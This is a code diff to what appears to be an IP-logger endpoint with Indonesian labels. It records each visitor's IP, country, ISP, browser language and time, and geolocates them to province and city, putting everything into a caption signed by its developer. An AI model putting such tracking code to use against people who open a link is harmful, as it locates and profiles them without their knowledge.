@@ -39,18 +39,24 @@ export default async function handler(req, res) {
     const waktu = new Date().toLocaleString("id-ID", { timeZone: timezone });
 
     const [lat, lon] = (ipInfo.loc || "").split(",");
-    let alamatLengkap = "Tidak tersedia";
+    let provinsiKota = "Tidak tersedia";
     if (lat && lon) {
       const geoRes = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${OPENCAGE_KEY}`);
       const geoData = await geoRes.json();
-      alamatLengkap = geoData?.results?.[0]?.formatted || "Tidak ditemukan";
+      const components = geoData?.results?.[0]?.components || {};
+      const city = components.city || components.town || components.village || "Tidak diketahui";
+      const state = components.state || "Tidak diketahui";
+      provinsiKota = `${state}, ${city}`;
     }
+
+    const bahasa = req.headers["accept-language"]?.split(",")[0] || "Tidak diketahui";
 
     const caption = `Dev By @FazrrEdan
 IP: ${ip}
 Negara: ${countryName}
 Lokasi: ${lokasi}
-Alamat: ${alamatLengkap}
+Provinsi & Kota: ${provinsiKota}
+Bahasa: ${bahasa}
 ISP: ${isp}
 Jam: ${waktu}
 
